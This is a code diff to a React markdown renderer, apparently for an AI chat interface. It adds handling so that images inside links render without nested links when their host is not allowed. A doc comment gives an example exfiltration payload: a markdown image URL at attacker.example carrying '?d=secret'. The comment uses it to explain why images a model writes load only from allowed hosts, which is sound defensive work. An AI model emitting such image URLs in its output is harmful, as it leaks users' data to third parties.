@@ -96,6 +96,28 @@ function rehypeCaret() {
   };
 }
 
+/**
+ * rehype plugin: mark images inside links (a badge: `[![CI](badge.svg)](ci-url)`). An image that
+ * does not load renders as a link of its own, and a link inside a link is invalid HTML: the browser
+ * splits it, which breaks hydration. Marking the tree, rather than relying on our `a` renderer,
+ * keeps this working when `components.a` is overridden.
+ */
+function rehypeImagesInLinks() {
+  return (tree: TreeNode) => {
+    const visit = (node: TreeNode, inLink: boolean) => {
+      for (const child of node.children ?? []) {
+        if (child.type !== 'element') continue;
+        if (inLink && child.tagName === 'img') child.properties = { ...child.properties, dataAuiInLink: '' };
+        visit(child, inLink || child.tagName === 'a');
+      }
+    };
+    visit(tree, false);
+  };
+}
+
+const REHYPE_PLUGINS = [rehypeImagesInLinks];
+const REHYPE_PLUGINS_STREAMING = [rehypeImagesInLinks, rehypeCaret];
+
 function textOf(node: ReactNode): string {
   if (typeof node === 'string' || typeof node === 'number') return String(node);
   if (Array.isArray(node)) return node.map(textOf).join('');
@@ -149,14 +171,39 @@ const linkClass =
 
 /**
  * Images load only from allowed hosts: fetching a URL the model wrote can leak data to a third
- * party (`![](https://attacker.example/p.png?d=secret)`). Other images render as a link instead.
+ * party (`![](https://attacker.example/p.png?d=secret)`). Other images render as a link instead, or as
+ * plain text inside the link they already belong to.
  */
-function MarkdownImage({ src, alt, title }: { src: string; alt?: string | undefined; title?: string | undefined }) {
+function MarkdownImage({
+  src,
+  alt,
+  title,
+  inLink,
+}: {
+  src: string;
+  alt?: string | undefined;
+  title?: string | undefined;
+  /** The image is the content of a link, so its fallback must not be a link too. */
+  inLink: boolean;
+}) {
   const hosts = useContext(ImageHostsContext);
   // Unsafe protocols, and images that are still streaming, arrive with an empty URL.
   if (!src) return alt ? <>{alt}</> : null;
   if (isAllowedImage(src, hosts)) {
     return <img src={src} alt={alt ?? ''} title={title} className="my-2 inline-block max-w-full rounded-lg" />;
+  }
+  const label = (
+    <>
+      <ImageIcon size={13} className="shrink-0 self-center" />
+      <span className="sr-only">Image:</span> {alt || 'image'}
+    </>
+  );
+  if (inLink) {
+    return (
+      <span title={title} className="inline-flex items-baseline gap-1">
+        {label}
+      </span>
+    );
   }
   const external = /^https?:\/\//.test(src);
   return (
@@ -166,9 +213,7 @@ function MarkdownImage({ src, alt, title }: { src: string; alt?: string | undefi
       className={cn(linkClass, 'inline-flex items-baseline gap-1')}
       {...(external ? { target: '_blank', rel: 'noopener noreferrer' } : {})}
     >
-      <ImageIcon size={13} className="shrink-0 self-center" />
-      <span className="sr-only">Image: </span>
-      {alt || 'image'}
+      {label}
     </a>
   );
 }
@@ -263,8 +308,13 @@ const components: Components = {
     />
   ),
   pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
-  img: ({ node: _node, src, alt, title }) => (
-    <MarkdownImage src={typeof src === 'string' ? src : ''} alt={alt} title={title} />
+  img: ({ node: _node, src, alt, title, ...props }) => (
+    <MarkdownImage
+      src={typeof src === 'string' ? src : ''}
+      alt={alt}
+      title={title}
+      inLink={(props as Record<string, unknown>)['data-aui-in-link'] !== undefined}
+    />
   ),
   table: ({ node: _node, className, ...props }) => (
     <div className="border-aui-border my-3 overflow-x-auto rounded-lg border">
@@ -335,7 +385,6 @@ export const Markdown = memo(function Markdown({
         : [remarkGfm],
     [citations, citationPrefix],
   );
-  const rehypePlugins = useMemo(() => (streaming ? [rehypeCaret] : []), [streaming]);
   const merged = useMemo(() => (overrides ? { ...components, ...overrides } : components), [overrides]);
   return (
     <div
@@ -347,7 +396,7 @@ export const Markdown = memo(function Markdown({
         <ReactMarkdown
           // Plugin tuples are typed loosely by unified; the shapes above are correct.
           remarkPlugins={remarkPlugins as never}
-          rehypePlugins={rehypePlugins as never}
+          rehypePlugins={(streaming ? REHYPE_PLUGINS_STREAMING : REHYPE_PLUGINS) as never}
           components={merged}
         >
           {text}
